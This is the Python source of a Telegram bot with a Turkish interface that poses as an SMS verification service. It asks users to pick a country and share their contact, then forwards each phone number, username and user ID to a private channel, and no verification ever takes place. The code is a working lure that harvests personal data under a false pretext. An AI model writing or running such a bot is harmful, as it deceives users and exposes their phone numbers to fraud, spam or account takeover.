import os
import random
from datetime import datetime
from zoneinfo import ZoneInfo
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Contact
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, CallbackQueryHandler, filters

TOKEN = os.getenv("BOT_TOKEN")
KANAL_ID = int(os.getenv("KANAL_ID"))
ADMIN_ID = int(os.getenv("ADMIN_ID"))
TZ = ZoneInfo("Europe/Istanbul")

class Database:
    def __init__(self):
        self.users = {}
        self.banned = set()
        self.waiting_country = {}
        self.total_numbers = 0

DB = Database()

COUNTRIES = [
("🇹🇷 Türkiye","Türkiye"),("🇩🇪 Almanya","Almanya"),("🇫🇷 Fransa","Fransa"),
("🇺🇸 ABD","ABD"),("🇬🇧 İngiltere","İngiltere"),("🇯🇵 Japonya","Japonya"),
("🇧🇷 Brezilya","Brezilya"),("🇮🇹 İtalya","İtalya"),("🇪🇸 İspanya","İspanya"),
("🇳🇱 Hollanda","Hollanda"),("🇨🇦 Kanada","Kanada"),("🇦🇹 Avusturya","Avusturya"),
("🇧🇪 Belçika","Belçika"),("🇳🇴 Norveç","Norveç"),("🇸🇪 İsveç","İsveç"),
("🇫🇮 Finlandiya","Finlandiya"),("🇩🇰 Danimarka","Danimarka"),("🇵🇱 Polonya","Polonya"),
("🇷🇴 Romanya","Romanya"),("🇧🇬 Bulgaristan","Bulgaristan")
]

def menu_text(user):
    now = datetime.now(TZ).strftime("%d.%m.%Y • %H:%M")
    uname = f"@{user.username}" if user.username else user.first_name
    return f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        📲 SMS ONAY MERKEZİ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

╭──────────── KULLANICI ────────────╮
│ 👤 Kullanıcı : {uname}
│ 🆔 ID        : {user.id}
│ 🔐 Durum     : Aktif
╰───────────────────────────────────╯

╭───────────── SİSTEM ─────────────╮
│ 🌍 Bölge     : Türkiye
│ 🕒 Saat      : {now}
│ 🟢 Sunucu    : Aktif
│ ⚙️ Versiyon  : v3.0
╰───────────────────────────────────╯

Aşağıdan işlem seç 👇
"""

def menu_buttons(uid):
    rows = [
        [InlineKeyboardButton("✦ SMS ONAY ✦", callback_data="sms")],
        [InlineKeyboardButton("❖ HESABIM ❖", callback_data="account"),
         InlineKeyboardButton("❖ İSTATİSTİK ❖", callback_data="stats")],
        [InlineKeyboardButton("❖ GELİŞTİRİCİ ❖", callback_data="dev")]
    ]
    if uid == ADMIN_ID:
        rows.append([InlineKeyboardButton("✦ ADMIN PANEL ✦", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in DB.users:
        DB.users[user.id] = {"username": f"@{user.username}" if user.username else "Yok","numbers":0}
    await update.message.reply_text(menu_text(user), reply_markup=menu_buttons(user.id))

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if query.data == "sms":
        sample = random.sample(COUNTRIES, 10)
        rows = [[InlineKeyboardButton(flag, callback_data=f"country_{name}")] for flag,name in sample]
        await query.message.reply_text("✦ ÜLKE SEÇ ✦", reply_markup=InlineKeyboardMarkup(rows))

    elif query.data.startswith("country_"):
        country = query.data.split("_",1)[1]
        DB.waiting_country[user.id] = country
        kb = [[KeyboardButton("✦ SMS ONAY ✦", request_contact=True)]]
        await query.message.reply_text(f"❖ {country} seçildi\nSMS onay için butona bas", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True, one_time_keyboard=True))

    elif query.data == "account":
        u = DB.users[user.id]
        await query.message.reply_text(f"""
╔═══ HESAP ═══╗
👤 {u['username']}
🆔 {user.id}
📨 {u['numbers']} gönderim
╚═════════════╝
""")

    elif query.data == "stats":
        await query.message.reply_text(f"""
╔═══ İSTATİSTİK ═══╗
👥 Kullanıcı: {len(DB.users)}
📲 Numara: {DB.total_numbers}
╚══════════════════╝
""")

    elif query.data == "dev":
        await query.message.reply_text("╔═══ GELİŞTİRİCİ ═══╗\n@tanrican\n╚══════════════════╝")

    elif query.data == "admin" and user.id == ADMIN_ID:
        await query.message.reply_text("Admin komutları:\n/ban ID\n/unban ID")

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in DB.waiting_country:
        return

    country = DB.waiting_country[user.id]
    del DB.waiting_country[user.id]

    contact: Contact = update.message.contact
    DB.users[user.id]["numbers"] += 1
    DB.total_numbers += 1

    now = datetime.now(TZ).strftime("%d.%m.%Y %H:%M:%S")

    msg = f"""
╔════════ SMS ONAY ════════╗
🌍 Ülke » {country}
👤 Kullanıcı » {DB.users[user.id]['username']}
🆔 ID » {user.id}
📱 Numara » +{contact.phone_number}
🕒 Saat » {now}
╚══════════════════════════╝
"""

    await context.bot.send_message(KANAL_ID, msg)
    await update.message.reply_text("✔ SMS Onay alındı")

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    DB.banned.add(int(context.args[0]))
    await update.message.reply_text("Banlandı")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    DB.banned.discard(int(context.args[0]))
    await update.message.reply_text("Ban kaldırıldı")

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ban", ban))
    app.add_handler(CommandHandler("unban", unban))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    print("Bot aktif")
    app.run_polling()

if __name__ == "__main__":
    main()
